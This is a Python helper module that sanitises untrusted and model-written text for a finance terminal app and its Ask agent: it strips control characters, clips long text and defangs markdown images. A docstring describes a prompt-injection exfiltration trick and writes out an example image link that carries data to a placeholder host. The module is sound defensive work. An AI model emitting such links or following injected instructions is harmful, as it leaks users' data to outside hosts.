"""Make untrusted text safe to show, to keep and to hand to a model.

Text a model writes can echo whatever it read: a news headline, a file, a database row.
The Ask log and the status bar show it with Textual's markup parsing off, but a raw
escape sequence in it is written to the terminal as it is, where it can retitle the
window, write to the clipboard, clear the screen or fake what is shown. And an answer
of unbounded length would be rendered and saved in full, so a runaway one would slow
each redraw. These helpers address both for the cockpit and the Ask agent.

The module sits outside ``fund.tui`` because the Ask agent (``fund.agents.ask_agent``)
uses it and the agent layer must not import the cockpit; :mod:`fund.tui.safe_text`
re-exports its public names. At import time it needs only the standard library;
:func:`describe_error` imports ``portopt_db.engine`` when it is called.
"""

from __future__ import annotations

import re

__all__ = [
    "MAX_MESSAGE_CHARS",
    "clip",
    "defang_markdown",
    "describe_error",
    "strip_control",
]

# Every C0 and C1 control character except the line feed and the tab, which are layout.
# That includes ESC (7-bit escape sequences start with it), the single-character C1
# introducers (0x9b is a CSI), BEL, and the carriage return, so CRLF text reads as
# plain lines.
_CONTROL = re.compile("[\x00-\x08\x0b-\x1f\x7f-\x9f]")
# Far more than an answer normally needs; the point is a bound, not a style.
MAX_MESSAGE_CHARS = 20_000
# An error shown to the adviser or the model is cut to this many characters, plus a
# note of how many were cut.
_ERROR_CHARS = 300
_IMAGE = re.compile(r"!\[(?P<alt>[^\]\n]*)\]\([^)\n]*\)")


def strip_control(text: str) -> str:
    """Remove terminal control characters, keeping line feeds and tabs."""
    return _CONTROL.sub("", text)


def clip(text: str, limit: int = MAX_MESSAGE_CHARS) -> str:
    """Shorten ``text`` to ``limit`` characters, saying how much was cut."""
    if len(text) <= limit:
        return text
    return f"{text[:limit]}\n… ({len(text) - limit} more characters not shown)"


def defang_markdown(text: str) -> str:
    """Replace embedded markdown images by their description.

    An exported conversation may be opened in a markdown previewer, and a model that
    was steered by untrusted text can write ``![](https://host/?d=<data>)``:
    previewing the file would then fetch that address. Ordinary links are left as
    they are.
    """
    return _IMAGE.sub(lambda m: f"[image: {m['alt']}]" if m["alt"] else "[image]", text)


def describe_error(exc: BaseException) -> str:
    """Return a short, safe description of an error for the adviser or the model.

    It is shown on screen and in the status bar, and returned to the model as a tool
    result. A driver error's own text embeds the SQL statement and its bound
    parameters, and a provider error may echo request details. So a driver error is
    cut to its first line (``portopt_db.engine.summarize_db_error``), control
    characters are removed, and a result longer than 300 characters is cut to 300
    plus a note of how many were cut.

    Args:
        exc: The error to describe.

    Returns:
        The description, or the error's class name when its text is empty.
    """
    from portopt_db.engine import summarize_db_error

    text = strip_control(summarize_db_error(exc)).strip()
    return clip(text or type(exc).__name__, _ERROR_CHARS)
